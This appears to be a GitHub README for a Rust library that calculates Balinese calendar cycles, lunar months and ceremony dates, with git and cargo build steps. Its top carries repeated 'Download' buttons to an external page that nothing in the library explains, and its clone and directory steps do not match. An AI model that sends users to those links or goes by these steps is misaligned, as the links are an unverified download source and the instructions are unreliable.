# Balinese Calendar v0.2.1 - Calendar Library 2026

> **Balinese Calendar is a Rust library for computing Saka, Pawukon, Wewaran, Wariga, lunar, and ceremony information, with astronomical sunrise support in version 0.2.1.**

[![Platform](https://img.shields.io/badge/Platform-Rust-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.2.1-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/tom-taylorle6425/balinese-calendar-lib?style=flat-square)](https://github.com/tom-taylorle6425/balinese-calendar-lib)

---

<p align="center">
  <a href="https://tom-taylorle6425.github.io/balinese-calendar-lib/">
    <img src="https://img.shields.io/badge/Download-Balinese%20Calendar%20Latest-brightgreen?style=for-the-badge" alt="Download Balinese Calendar">
  </a>
</p>

> **[Download Balinese Calendar v0.2.1](https://tom-taylorle6425.github.io/balinese-calendar-lib/)**

---

[Download Latest Build](https://tom-taylorle6425.github.io/balinese-calendar-lib/)

---

## Overview

Balinese Calendar is a native Rust library for calculating dates and traditional classifications used by the Balinese Saka calendar. Its data model includes the 210-day Pawukon cycle, Wewaran naming patterns, Sasih lunar months, Saka years, Urip values, Rahinan ceremony dates, and Wariga categories.

Rather than serving only as a date display tool, the library provides structured results for calendar-driven software. Applications can define a day using astronomical sunrise, supply their own boundary rule, create markers for date ranges in batches, and optionally compile for WebAssembly in browser or cross-platform environments.

---

## Capabilities

- Traverse the traditional 210-day Pawukon cycle.
- Calculate Wewaran names and associated calendar values.
- Resolve Sasih lunar months together with Saka year data.
- Find dates connected with Rahinan ceremonies.
- Calculate Urip values for individual calendar dates.
- Return Wariga classifications for applications using traditional calendar logic.
- Choose astronomical sunrise or a custom day-start rule.
- Produce structured calendar data for other tools and services.
- Create calendar markers in batches across extended date ranges.
- Support optional WebAssembly-based integrations.
- Perform climate-aware seasonal calculations.

---

## Installation

First obtain the source and move into the project directory:

```bash
git clone https://github.com/tom-taylorle6425/balinese-calendar-lib.git
cd balinese-calendar
```

Compile the library with Cargo:

```bash
cargo build
```

Use the release profile when you need an optimized build:

```bash
cargo build --release
```

To consume a local checkout from another Rust project, add this dependency to `Cargo.toml`:

```toml
[dependencies]
balinese-calendar = { path = "../balinese-calendar" }
```

When working from a published package, use the package name and release instructions provided for that particular build.

---

## Getting Started

A standard calculation flow can be organized as follows:

1. Supply one Gregorian date or a date interval.
2. Choose astronomical sunrise or define a custom day boundary.
3. Calculate the applicable Saka, Pawukon, Wewaran, and Sasih information.
4. Access ceremony, Urip, and Wariga values from the structured result.
5. Produce single-date output or batch markers for use in an application calendar.

Build and launch the available examples or integration entry points with:

```bash
cargo run --release
```

Execute the test suite with:

```bash
cargo test
```

If your project uses WebAssembly, build the optional target using the target configuration required by your application.

---

## Configuration Options

The start of a calendar day may be tied to astronomical sunrise or replaced with an application-defined rule. This makes it possible to use location-sensitive sunrise calculations or a fixed boundary suited to a particular scheduling system.

A conceptual configuration could be represented as:

```toml
[calendar]
day_boundary = "astronomical_sunrise"
batch_markers = true
wasm = false
seasonal_calculations = true
```

The available settings depend on the integration approach and the Cargo features enabled for the build. Consult the crate source and its feature definitions before choosing production configuration values.

---

## Requirements

- A Rust toolchain that includes Cargo.
- A Rust compilation target supported by the project.
- Extra target setup for WebAssembly builds.
- Date and location information appropriate for sunrise-based calculations.
- Enough storage for the application and generated calendar marker output.
- Internet access may be needed to clone the repository or download dependencies.

---

## Frequently Asked Questions

### Which calendar systems are included?

The library handles the Balinese Saka calendar, Pawukon cycles, Wewaran patterns, Sasih lunar months, Saka years, Rahinan dates, Urip values, and Wariga classifications.

### Can calculations use sunrise as the beginning of a day?

Yes. Astronomical sunrise can define the day boundary, and applications may instead provide custom boundary behavior.

### Does it handle ranges of dates?

Yes. Batch marker generation is available when an application needs calendar data for a larger date range.

### Can the library compile for WebAssembly?

WebAssembly is supported as an optional integration target. Configure and enable the appropriate Rust target for the application using it.

### What is the update process for a newer release?

Fetch the newest repository changes, inspect the release notes and any configuration updates, and create an optimized build:

```bash
git pull
cargo build --release
```

### What can cause an unexpected calculation?

Check the supplied date, the location information used for sunrise computation, the selected day-boundary rule, and any seasonal or calendar settings. It is also worth confirming that the Rust toolchain and dependency versions correspond to the project configuration.

### How can I ask for assistance?

Create a repository issue that includes a concise problem description, the input conditions, the expected and actual results, plus relevant Rust and build information.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
